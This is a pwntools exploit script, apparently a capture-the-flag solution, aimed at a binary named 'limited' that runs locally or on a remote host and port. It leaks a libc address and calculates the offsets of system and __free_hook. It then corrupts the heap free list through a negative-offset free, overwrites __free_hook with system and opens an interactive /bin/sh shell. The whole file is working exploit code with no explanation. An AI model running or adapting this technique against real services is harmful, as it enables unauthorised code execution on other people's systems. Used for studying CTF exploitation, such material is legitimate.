from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './limited'
HOST = '160.251.17.135'
PORT = 10012

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


r = start()
if args.D:
	debug(r, [])

r.recvuntil(':')
leak = int(r.recvuntil('\n', True), 16)
dbg('leak')
base = leak - 0x64f70
system = base + 0x4f550
fh = base + 0x3ed8e8


def a(size, content):
	r.sendlineafter(':\n', '0')
	r.sendlineafter(':\n', str(size))
	r.sendafter(':\n', content)
def d(offset):
	r.sendlineafter(':\n', '1')
	r.sendlineafter(':\n', str(offset))

a(0x3a8, 'a')
d(0)
d(-0x210)
a(0xf8, p64(fh-8))
a(0x18, "/bin/sh\x00"+p64(system))
d(0)

r.interactive()
r.close()
